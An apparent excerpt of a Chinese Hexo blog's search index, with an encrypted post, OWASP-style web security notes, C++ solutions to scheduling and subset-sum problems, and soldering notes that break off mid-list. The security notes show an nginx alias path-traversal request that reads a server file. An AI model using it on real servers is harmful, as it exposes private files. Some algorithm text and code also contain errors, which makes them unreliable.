d1517ea510d3b181dbba5b7ece76d7cf9bc13f2f47d27dc88e973472949491e38b572d193e018f23d1cbea1a0c9331230b5bd24820f439a7b892831ba165f9eb5da01f63e54c8ac94f5d4d6dd7ff7e907c9cdea103c47d6d38057aaff22dc6f1e00405077f9ea5e8b0470d4f8ec8340f0844a70fd60118a284c37b79da494458d76cbf1089e21f42182187df168b722de7bacbaf2e53ebf44133e7cb05910c28d5a0bed27cb6d62554e7bd20a6836ab78c668e61ab922b3bf5c252f01fe228eabd29c0f9363ced23192b5b21be7ec8da09a9677b022792eac6589ce830f0d26e92f3457458be8f659029fc1aca96ac02a008118608125dd9db6d150eaaefcf28b38423dd7b368c88f261b909a8cf5d571cdfec89a39b194430d42ee599e9d30704df0bead2192fb01054adf85d6c9ac63a41fe5392a5a5442b70b6f108d46d0f9f7703332002996cba326cafa12a0b0b7ffd3f640dff4b7fe068c4d35a06c3fbb51a3842f54461979efafa9201ad8624afb89316faab6a8cd7add1490d9d31a93f78572b98aac9bfa8ae1f19304db9d5f400d76ff2aec92266d92336c04933259988649fd951f8b693929e2c88240cc68110067b4226f9905f06cefbec84901c65ad880305d22a643f3e986d3b73cd8435d79edd35b24d132de6879d7a2909a674c7eed5399360a54ce3d0a844ea685ead9b1d24c1e0d8feeb3aef894b64edbb346b9ef745cc7cfadc18dcee40c746a3ba05d9dcfdefa0fb333ea99ed2a5eca60a62071d114d17e1d04efd6e38bff42800058e6841bb1fb1ddc79305ccb6a8b79a9a51ccfd379648f79ba778f05307fb19bcb1d78c41cceb4b78fffd233b2c81c9300e193792d04638d056a1b0e9ed72b9422e2198c99f4c49fc1de991d9d4361130e22d4efcc85f4a03a8d14163eec128edc3f031f5209b9080262ec9899a2c6afbdfd75d5e8e9f89fbf5c22de21cf6ff43034097ba79ea9b7538f428ef333aeff528c60072f3a860bce8fd87075b286d31d2dd06fa1d78261430dfcb57f1eda011d2b40fe2633de0c02ab45c08f4b847ed7ea2c5e221116736a8d1316c4ef619e0a1cb9553a53653456880ab971d7035a622c15312d4a5ddf66cb6cd072882bfb2cc78f9ab0cccf60485c7aa9ab2f3db53d540dae7517332c4674ec4f35ad10682b53e1a79d2ceea2c714540dae05fe7d2b7bd4ae5bd6868f1d83b23e792c30d58dc169f6d75c1c51fdd8707ba8eff644ff1b3b5687131b0036162fef87a5baf8604d4dac18779eb06b69ea4f6ac25b16321f2838a58eb40dc950fb08b28ef0b6283470701243dbd0a9197a6fa9d64e3585b8495e2a5f621fde6d4a2b1fb24ce0be22524d1ddc09eae29ad9362eee155bb64f54e8813a1d2f4b61632fc5475cd34e4a72824e8254e83b48587ea285189daa68d1791facb25022495c8eb7d72a4bb05c65d6797fa0095fb33422fb394c9c95fad14490cd8711a830bffd2a5004c824cb06faf7840ecec35ba46f7441db754e935591b8656a206275ddc7e8a801e487f384d5ca7aedc39e26739a9835af548a05ae901f8011b12a40029429a52a9a0ff5701f3310d2f3d24509da093ccb56a030bddaa3ff543feb280443e7e299eef03be55f1c6127773a92639bef10c9469cc31c772888b313b3df2c48e91a90421bf14d26cf66fb934aa9435e1fbc8041e916e4d500b7d4a6d89e7318d9aafd5da74ece311334113eb439efd282c4bff2d148202bbc21590b759b5166f3f931c0dcbfc0d88ce4752a75e809b418a4fd2239ea092cbaccf4dc06f90c1b4fe12242997c8ac208ce6fe95984fc793a3fcc8bae2bbcc8ab2e43398e93c27b574121b55a74bbf7a16d228bc79c4449512d84794366b74b4f12b54e4ac0be14b6f493eda83e139f95d11dd19be0b9d31321505ac02d62aa1bc6fda9df1ad46f24af5e42dd2dadd364847d2d721c923381297d9b20cda992875f8e462691daed54505dc345b330ba97b3e1c9bbb64a81ae15743eaca5e5f33100e7a9edb87ef0b34e07db9f59a830a89dfbee2a65fcab9958e0df8a7d9dab744200f0b1d5c37ad3ef3b8f9cd4dd81f6558a3c5f7c1711e5dc41493b8c8dc657f0f420ba7144f248b3616781f9554242c135d0e807a560270d7765d5475ebebc1aaab94222c29770616817e1ca606ccf8c4599ae6c777c88cceea81fa98b0c44020af4586553b0511e7798a6bc009e98fd05d1df4f6ed640e41685274c330c6d690241c3a3d6b85dc64c2e2fd2baf66af4cfebd48920e0de6ace46a2d27775d71802601994fec75462fcbdce591f14225968c61074aac32c9ad0684fc720eb0309945d393197118209739fb08cff7db533892c8fc76a59bce04fb62e06459a093e35091756f8f0b44ac0272355bf657b40d356ffcdd26aef47169a8c6d41341efdac1ca352f216ae0304b0e0e7873d553b554de30b6063e5229f7ba0eedfde56f006c5ac2d165f0e3d5c201d6d64e9bfbc7fa357cc72905fce2a0c0220e9568a2724ea0b06bc65f55c5a6ce100b51a93a44fb33393afcca2f53eaabed01e9c72c16fea00d260b26fdfa6e74af03ae514be617f70eebfa0a7d560c80a623dba9b7ee596f9f12ae1f778b21743d3f967e92b7776f80de183649bfb64be9d75eaa0b5506fef089759f685d7f2c9b3eb62</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>Others</category>
      </categories>
  </entry>
  <entry>
    <title>web相关知识</title>
    <url>/2021/10/11/web%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/</url>
    <content><![CDATA[<h1 id="web相关知识"><a href="#web相关知识" class="headerlink" title="web相关知识"></a>web相关知识</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>对web相关知识的整理，包括自己熟悉的和不熟悉的。</p>
<h2 id="Broken-Access-Control，越权访问"><a href="#Broken-Access-Control，越权访问" class="headerlink" title="Broken Access Control，越权访问"></a>Broken Access Control，越权访问</h2><h2 id="Cryptographic-Failures，加密失败"><a href="#Cryptographic-Failures，加密失败" class="headerlink" title="Cryptographic Failures，加密失败"></a>Cryptographic Failures，加密失败</h2><h2 id="Injection，注入"><a href="#Injection，注入" class="headerlink" title="Injection，注入"></a>Injection，注入</h2><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><h2 id="Insecure-Design，不安全的设计"><a href="#Insecure-Design，不安全的设计" class="headerlink" title="Insecure Design，不安全的设计"></a>Insecure Design，不安全的设计</h2><h2 id="Security-Misconfiguration，安全配置错误"><a href="#Security-Misconfiguration，安全配置错误" class="headerlink" title="Security Misconfiguration，安全配置错误"></a>Security Misconfiguration，安全配置错误</h2><h3 id="niginx配置不当导致的目录穿越"><a href="#niginx配置不当导致的目录穿越" class="headerlink" title="niginx配置不当导致的目录穿越"></a>niginx配置不当导致的目录穿越</h3><p>Nginx在配置别名（Alias）的时候，如果忘记加<code>/</code>，将造成一个目录穿越漏洞。</p>
<p>修改<code>nginx.conf</code>，添加如下配置：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">location /file &#123;</span><br><span class="line">alias /var/www/html/example/;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在如下配置中设置目录别名时<code>/file</code>配置为<code>/var/www/html/example/</code>的别名，</p>
<p>那么当我们访问<code>/file../</code>时,nginx实际处理的路径时<code>/var/www/html/example/../</code>也就是<code>/var/www/html/</code>，从而实现了穿越目录。</p>
<p>访问<code>http://test.com/file../sql.conf</code>，会返回服务器上<code>/var/www/html/sql.conf</code>的内容</p>
<h2 id="Vulnerable-and-Outdated-Components，易受攻击的和过时的组件"><a href="#Vulnerable-and-Outdated-Components，易受攻击的和过时的组件" class="headerlink" title="Vulnerable and Outdated Components，易受攻击的和过时的组件"></a>Vulnerable and Outdated Components，易受攻击的和过时的组件</h2><h2 id="Identification-and-Authentication-Failures，识别和认证失败"><a href="#Identification-and-Authentication-Failures，识别和认证失败" class="headerlink" title="Identification and Authentication Failures，识别和认证失败"></a>Identification and Authentication Failures，识别和认证失败</h2><h2 id="Software-and-Data-Integrity-Failures，软件和数据完整性故障"><a href="#Software-and-Data-Integrity-Failures，软件和数据完整性故障" class="headerlink" title="Software and Data Integrity Failures，软件和数据完整性故障"></a>Software and Data Integrity Failures，软件和数据完整性故障</h2><h2 id="Security-Logging-and-Monitoring-Failures，安全日志记录和监控失败"><a href="#Security-Logging-and-Monitoring-Failures，安全日志记录和监控失败" class="headerlink" title="Security Logging and Monitoring Failures，安全日志记录和监控失败"></a>Security Logging and Monitoring Failures，安全日志记录和监控失败</h2><h2 id="Server-Side-Request-Forgery-SSRF-，服务器端请求伪造-SSRF"><a href="#Server-Side-Request-Forgery-SSRF-，服务器端请求伪造-SSRF" class="headerlink" title="Server-Side Request Forgery (SSRF)，服务器端请求伪造 (SSRF)"></a>Server-Side Request Forgery (SSRF)，服务器端请求伪造 (SSRF)</h2>]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>动态规划算法——双机调度问题</title>
    <url>/2021/04/05/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E7%AE%97%E6%B3%95%E2%80%94%E2%80%94%E5%8F%8C%E6%9C%BA%E8%B0%83%E5%BA%A6%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><h3 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述:"></a>问题描述:</h3><p>用2台处理机<code>A</code>和<code>B</code>处理<code>n</code>个作业。设第<code>i</code>个作业交给机器A处理时需要时间<code>ai</code>，若由机器<code>B</code>来处理,则需要时间bi。</p>
<p>由于各作业的特点和机器的性能关系，很可能对于某些<code>i</code>，有<code>ai ≥ bi</code>，而对于某些<code>j ≠ i</code>，有<code>aj &lt; bj</code>。既不能将一个作业分开由2台机器处理，也没有一台机器能同时处理2个作业。</p>
<p>研究一个实例:</p>
<p><code>(a1, a2, a3, a4, a5, a6) = (2, 5, 7, 10, 5, 2)</code></p>
<p><code>(b1, b2, b3, b4, b5, b6) = (3, 8, 4, 11, 3, 4)</code></p>
<h3 id="算法设计"><a href="#算法设计" class="headerlink" title="算法设计:"></a>算法设计:</h3><p>对于给定的n个作业，找出一个最优调度方案，使<code>A</code>、<code>B</code>两台机器处理完这n个作业的时间最短。</p>
<h3 id="数据输入"><a href="#数据输入" class="headerlink" title="数据输入:"></a>数据输入:</h3><p>由文件<code>input. txt</code>提供输入数据。</p>
<p>文件的第1行是1个正整数<code>n</code>,表示要处理<code>n</code>个作业</p>
<p>在接下来的2行中,每行有n个正整数，分别表示处理机<code>A</code>和<code>B</code>处理第<code>i</code>个作业需要的处理时间。</p>
<h3 id="结果输出"><a href="#结果输出" class="headerlink" title="结果输出:"></a>结果输出:</h3><p>将计算出的最短处理时间输出到文件<code>output txt</code>。</p>
<ul>
<li><p>输入文件示例</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">input.txt</span><br><span class="line"></span><br><span class="line">6</span><br><span class="line">2 5 7 10 5 2</span><br><span class="line">3 8 4 11 3 4</span><br></pre></td></tr></table></figure></li>
<li><p>输出文件示例</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">output.txt</span><br><span class="line"></span><br><span class="line">15</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="算法思路"><a href="#算法思路" class="headerlink" title="算法思路"></a>算法思路</h2><ul>
<li>找出<code>n</code>个任务所有耗时中最大的数<code>m</code>，也就是<code>A</code>和<code>B</code>数组的最大值。</li>
<li>设置三维布尔量数组<code>p[mn][mn][n]</code>，布尔量<code>p[i][j][k]</code>表示前<code>k</code>个作业可以在处理机<code>A</code>用时不超过<code>i</code>，处理机B不超过<code>j</code>的时间内完成。动态规划算法：<code>p[i][j][k] = p[i-ak][j][k-1] | p[i][j-bk][k-1]</code>（<code>|</code>为按位与运算符）</li>
<li>由上一步所得的结果我们可以找到时间最短的答案，具体是遍历布尔量为1的<code>k = n</code>的数组，取<code>min(i, j)</code>，如果比前一个小则取这个</li>
<li>具体算法如下</li>
</ul>
<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read</span><span class="params">( )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ifstream infile ;</span><br><span class="line">	infile.<span class="built_in">open</span>( <span class="string">&quot;input.txt&quot;</span> ) ;</span><br><span class="line">	infile &gt;&gt; n ;</span><br><span class="line">	</span><br><span class="line">	a = <span class="keyword">new</span> <span class="keyword">int</span>[n] ;</span><br><span class="line">	b = <span class="keyword">new</span> <span class="keyword">int</span>[n] ;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">for</span>( <span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; n ; i ++ )</span><br><span class="line">	&#123;</span><br><span class="line">		infile &gt;&gt; a[i] ;</span><br><span class="line">		m = <span class="built_in">max</span>( a[i] , m ) ;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>( <span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; n ; i ++ )</span><br><span class="line">	&#123;</span><br><span class="line">		infile &gt;&gt; b[i] ;</span><br><span class="line">		m = <span class="built_in">max</span>( b[i] , m ) ;</span><br><span class="line">	&#125;</span><br><span class="line">	mn = m * n ;</span><br><span class="line">	</span><br><span class="line">	infile.<span class="built_in">close</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dyna</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">bool</span>*** p = <span class="keyword">new</span> <span class="keyword">bool</span>** [mn+<span class="number">1</span>] ;</span><br><span class="line">	<span class="keyword">for</span>( <span class="keyword">int</span> i = <span class="number">0</span> ; i &lt;= mn ; i ++ )</span><br><span class="line">	&#123;</span><br><span class="line">		p[i] = <span class="keyword">new</span> <span class="keyword">bool</span>* [mn+<span class="number">1</span>] ;</span><br><span class="line">		<span class="keyword">for</span>( <span class="keyword">int</span> j = <span class="number">0</span> ; j &lt;= mn ; j++ )</span><br><span class="line">		&#123;</span><br><span class="line">			p[i][j] = <span class="keyword">new</span> <span class="keyword">bool</span> [n+<span class="number">1</span>] ;</span><br><span class="line">			p[i][j][<span class="number">0</span>] = <span class="literal">true</span> ;</span><br><span class="line">			<span class="keyword">for</span>( <span class="keyword">int</span> k = <span class="number">1</span> ; k &lt;= n ; k ++ )</span><br><span class="line">			&#123;</span><br><span class="line">				p[i][j][k] = <span class="literal">false</span> ;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>( <span class="keyword">int</span> k = <span class="number">1</span> ; k &lt;= n ; k ++ )</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>( <span class="keyword">int</span> i = <span class="number">0</span> ; i &lt;= mn ; i++ )</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">for</span>( <span class="keyword">int</span> j = <span class="number">0</span> ; j &lt;= mn ; j++)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span>( i - a[k<span class="number">-1</span>] &gt;= <span class="number">0</span> ) p[i][j][k] = p[i-a[k<span class="number">-1</span>]][j][k<span class="number">-1</span>] ;</span><br><span class="line">				<span class="keyword">if</span>( j - b[k<span class="number">-1</span>] &gt;= <span class="number">0</span> ) p[i][j][k] = p[i][j][k] || p[i][j-b[k<span class="number">-1</span>]][k<span class="number">-1</span>] ;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">int</span> opt = mn ;</span><br><span class="line">	<span class="keyword">for</span>( <span class="keyword">int</span> i = <span class="number">0</span> ; i &lt;= mn ; i ++ )</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>( <span class="keyword">int</span> j= <span class="number">0</span> ; j &lt;= mn ; j++ )</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>( p[i][j][n] )</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">int</span> tmp = <span class="built_in">max</span>( i , j ) ;</span><br><span class="line">				<span class="keyword">if</span>( tmp &lt; opt ) opt = tmp ;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	ofstream outfile ;</span><br><span class="line">	outfile.<span class="built_in">open</span>( <span class="string">&quot;output.txt&quot;</span> ) ;</span><br><span class="line">	outfile &lt;&lt; opt &lt;&lt; endl ;</span><br><span class="line"> 	outfile.<span class="built_in">close</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">read</span>() ;</span><br><span class="line">	<span class="built_in">dyna</span>() ;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span> ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>上述算法的时间复杂度为<code>O(m2n3) </code></p>
]]></content>
      <categories>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Dynamic programming</tag>
      </tags>
  </entry>
  <entry>
    <title>回溯法——子集和问题</title>
    <url>/2021/04/24/%E5%9B%9E%E6%BA%AF%E6%B3%95%E2%80%94%E2%80%94%E5%AD%90%E9%9B%86%E5%92%8C%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<h1 id="子集和问题"><a href="#子集和问题" class="headerlink" title="子集和问题"></a>子集和问题</h1><h2 id="问题描述："><a href="#问题描述：" class="headerlink" title="问题描述："></a>问题描述：</h2><p>子集和问题的一个实例为<code>&lt;S,t&gt;</code>。</p>
<p>其中，<code>S=&#123;s1,x2,...,xn&#125;</code>是一个正整数的集合，c是一个正整数。</p>
<p>子集和问题判定是否存在S的一个子集<code>S1</code>，使得集合中所有元素的和等于c。</p>
<p>试设计一个解子集和问题的回溯法。</p>
<h2 id="算法设计："><a href="#算法设计：" class="headerlink" title="算法设计："></a>算法设计：</h2><p>对于给定的正整数集合<code>S=&#123;s1,x2,...,xn&#125;</code>和正整数c，计算S的一个子集，使得子集和为c</p>
<h2 id="数据输入："><a href="#数据输入：" class="headerlink" title="数据输入："></a>数据输入：</h2><p>由文件<code>input.txt</code>提供输入数据。</p>
<p>文件第1行有2个整数n和c，n表示S的大小，c是子集和的目标值。</p>
<p>接下来的1行中，有n个正整数，表示集合S中的元素。</p>
<h2 id="结果输出："><a href="#结果输出：" class="headerlink" title="结果输出："></a>结果输出：</h2><p>将子集和问题的解输出到文件<code>output.txt</code>。</p>
<p>当问题无解时，输出“No Solution！”。</p>
<ul>
<li>输入文件示例</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">input.txt</span><br><span class="line">5 10</span><br><span class="line">2 2 6 5 4</span><br></pre></td></tr></table></figure>

<ul>
<li>输出文件示例</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">output.txt</span><br><span class="line">2 2 6</span><br></pre></td></tr></table></figure>

<h2 id="算法思路："><a href="#算法思路：" class="headerlink" title="算法思路："></a>算法思路：</h2><ul>
<li>回溯法的步骤为：<ul>
<li>修改当前节点状态</li>
<li>递归子节点状态</li>
<li>回改当前节点状态</li>
</ul>
</li>
<li><code>backtracking</code>函数：<ul>
<li>我们将<code>value</code>的值加上当前节点的值，同时添加当前元素到<code>tem</code>数组里。</li>
<li>递归下一节点，<code>backtracking(i + 1, n, c, S, tem, answer, value);</code></li>
<li>弹出<code>tem</code>数组刚刚添加的元素，<code>value</code>减去刚才加上的值</li>
<li>如果<code>value</code>值等于<code>c</code>，那么就添加此时的<code>tem</code>数组到<code>answer</code>二维数组中</li>
</ul>
</li>
<li><code>ssumc</code>函数：<ul>
<li>如果<code>answer</code>二维数组为空，则返回<code>tem</code>数组</li>
<li>如果<code>answer</code>不为空，则返回<code>answer</code>数组的第一个元素</li>
</ul>
</li>
<li><code>main</code>函数：<ul>
<li>从文件输入n、c、S数组</li>
<li>数组<code>ans</code>等于函数<code>ssumc</code>函数的返回值</li>
<li>输出数组元素，如果为空，则输出“No Solution！”到文件中</li>
</ul>
</li>
</ul>
<h2 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std ;</span><br><span class="line"></span><br><span class="line"><span class="function">ifstream <span class="title">infile</span><span class="params">(<span class="string">&quot;input.txt&quot;</span>)</span></span>;</span><br><span class="line"><span class="function">ofstream <span class="title">outfile</span><span class="params">(<span class="string">&quot;outfile.txt&quot;</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">backtracking</span><span class="params">(<span class="keyword">int</span> pos, <span class="keyword">int</span> &amp;n, <span class="keyword">int</span> &amp;c, vector&lt;<span class="keyword">int</span>&gt; S, vector&lt;<span class="keyword">int</span>&gt; &amp;tem,  vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; &amp;answer, <span class="keyword">int</span> value)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">ssumc</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> c, vector&lt;<span class="keyword">int</span>&gt; S)</span> </span>&#123;</span><br><span class="line">	vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; answer;</span><br><span class="line">	vector&lt;<span class="keyword">int</span>&gt; tem;</span><br><span class="line">	<span class="keyword">int</span> value = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">backtracking</span>(i, n, c, S, tem, answer, value);</span><br><span class="line">	<span class="keyword">if</span> (!answer.<span class="built_in">empty</span>())</span><br><span class="line">		<span class="keyword">return</span> answer[<span class="number">0</span>];</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">return</span> tem;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">backtracking</span><span class="params">(<span class="keyword">int</span> pos, <span class="keyword">int</span> &amp;n, <span class="keyword">int</span> &amp;c, vector&lt;<span class="keyword">int</span>&gt; S, vector&lt;<span class="keyword">int</span>&gt; &amp;tem, vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; &amp;answer, <span class="keyword">int</span> value)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (value == c) &#123;</span><br><span class="line">		answer.<span class="built_in">push_back</span>(tem);</span><br><span class="line">		<span class="keyword">return</span> ;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = pos; i &lt; n; i++) &#123;</span><br><span class="line">		tem.<span class="built_in">push_back</span>(S[i]);</span><br><span class="line">		value += S[i];</span><br><span class="line"></span><br><span class="line">		<span class="built_in">backtracking</span>(i + <span class="number">1</span>, n, c, S, tem, answer, value);</span><br><span class="line"></span><br><span class="line">		tem.<span class="built_in">pop_back</span>();</span><br><span class="line">		value -= S[i];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	vector&lt;<span class="keyword">int</span>&gt; S;</span><br><span class="line">	<span class="keyword">int</span> n, c;</span><br><span class="line">	infile &gt;&gt; n &gt;&gt; c;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">		<span class="keyword">int</span> tem;</span><br><span class="line">		infile &gt;&gt; tem;</span><br><span class="line">		S.<span class="built_in">push_back</span>(tem);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	vector&lt;<span class="keyword">int</span>&gt; ans = <span class="built_in">ssumc</span>(n, c, S);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">auto</span> it = ans.<span class="built_in">begin</span>(); it != ans.<span class="built_in">end</span>(); it++) &#123;</span><br><span class="line">		outfile &lt;&lt; *it &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (ans.<span class="built_in">empty</span>())</span><br><span class="line">		outfile &lt;&lt; <span class="string">&quot;No Soution!&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>顾名思义，回溯法的核心是回溯。</p>
<p>在搜索到某一节点的时候，如果我们发现目前的节点（及其子节点）并不是需求目标时，我们回退到原来的节点继续搜索，并且把在目前节点修改的状态还原。</p>
<p>这样的好处是我们可以始终只对图的总状态进行修改，而非每次遍历时新建一个图来储存状态。</p>
]]></content>
      <categories>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>回溯算法</tag>
      </tags>
  </entry>
  <entry>
    <title>单片机相关知识</title>
    <url>/2021/07/06/%E5%B0%8F%E5%AD%A6%E6%9C%9F/</url>
    <content><![CDATA[<h1 id="单片机相关知识"><a href="#单片机相关知识" class="headerlink" title="单片机相关知识"></a>单片机相关知识</h1><h2 id="学习机制作"><a href="#学习机制作" class="headerlink" title="学习机制作"></a>学习机制作</h2><h3 id="2-1-焊接前准备"><a href="#2-1-焊接前准备" class="headerlink" title="2.1 焊接前准备"></a>2.1 焊接前准备</h3><p>焊接前先要认识并熟悉各个元器件以及电烙铁。</p>
<p><img src="/2021/07/06/%E5%B0%8F%E5%AD%A6%E6%9C%9F/6e12b1f3e03575a1689ac0345784efe2.jpg" alt="img"></p>
<p><img src="/2021/07/06/%E5%B0%8F%E5%AD%A6%E6%9C%9F/b69f07dad201aa1b7b135df1e69b19f5.jpg" alt="img"></p>
<p><img src="/2021/07/06/%E5%B0%8F%E5%AD%A6%E6%9C%9F/R-C.4345cfe170b3290f0afe5f3ce2551266" alt="电焊台"></p>
<p>训练题：</p>
<ol>
<li>视频中出现的焊台型号是（ ATTEN936）</li>
<li>视频中电焊台的电源开关在（右边 ）</li>
<li>烙铁处于加热状态时，电焊台面板上的指示灯（ 红灯闪烁）</li>
<li>电焊台工作时，烙铁温度适宜的调整范围是（ 300-350 ℃）</li>
<li>焊接操作图片中出现的烙铁头的形状是（ K型（刀头型））</li>
<li>关于正常工作的烙铁头最恰当地描述是（焊接部位无氧化现象，能正常发热，上锡后能很快浸润 ）</li>
<li>电焊台工作时，建议将烙铁温度调到多少（ 320 ℃）</li>
<li>烙铁头出现以下哪种（ 烙铁头发黑，不能粘锡）现象，判断烙铁头不正常。</li>
<li>正确手拿烙铁的把握方式是（ 握笔式）</li>
</ol>
<h3 id="2-2-按键焊接"><a href="#2-2-按键焊接" class="headerlink" title="2.2 按键焊接"></a>2.2 按键焊接</h3><p>按键无方向、无正负极、正面插入安装，一共有16个焊点，每个按键4个焊点。</p>
<p>有四个按键需要安装，安装位置分别为K1、K2、K3、RST，焊接步骤：</p>
<ol>
<li>将按键的四个引脚分别对准相应焊盘，插入电路板的正确位置，按住按键上方，用力往下使按键的四个引脚插入焊盘；</li>
<li>将电路板翻转到反面，稳定电路板；</li>
<li>用已经加热的烙铁加热焊盘，如图1-3-5所示；</li>
<li>送焊锡；</li>
<li>焊锡离开，烙铁离开，观察焊锡是否圆润光滑；</li>
</ol>
<p>训练题：</p>
<ol>
<li><p>按键焊接时，是在电路板的（反 ）面进行焊接操作。</p>
</li>
<li><p>一个按键的焊接有（4 ）个焊点</p>
</li>
<li><p>电路板手工焊接的第一个元器件是（按键 ）</p>
</li>
<li><p>判断：按键有正负号。（<em>×</em> ）</p>
</li>
<li><p>判断：一个按键的4只引脚可分成两对，各自单独工作。（<em>×</em> ）</p>
</li>
<li><p>判断：按键安装到电路板上有上、下2种方向。（<em>×</em> ）</p>
</li>
<li><p>判断：这种4引脚按键，可随意挑选其中两只引脚，组成一对开关。（<em>×</em> ）</p>
</li>
<li><p>判断：按键安装到电路板上时有左、右2种方向。（<em>×</em> ）</p>
</li>
<li><p>电路板按键焊接分以下步骤，请填写正确排序是（  ECDAB ）。</p>
<p>A. 送焊锡</p>
<p>B. 焊锡离开，烙铁离开</p>
<p>C. 将电路板翻转到反面，稳定电路板</p>
<p>D. 用已经加热的烙铁加热焊盘</p>
<p>E. 将按键插入电路板的正确位置</p>
</li>
</ol>
<h3 id="2-3-晶体1焊接"><a href="#2-3-晶体1焊接" class="headerlink" title="2.3 晶体1焊接"></a>2.3 晶体1焊接</h3><p>晶体1可振荡频率为12 MHz，无方向，正面插入安装，2个焊点，安装位置CY1。</p>
<p>焊接步骤：</p>
<ol>
<li>将12 MHz晶体1插入电路板上相应的安装位置CY1，用手指按住晶振1的上方使其与电路板接触；</li>
<li>翻转电路板至其反面，稳定电路板；</li>
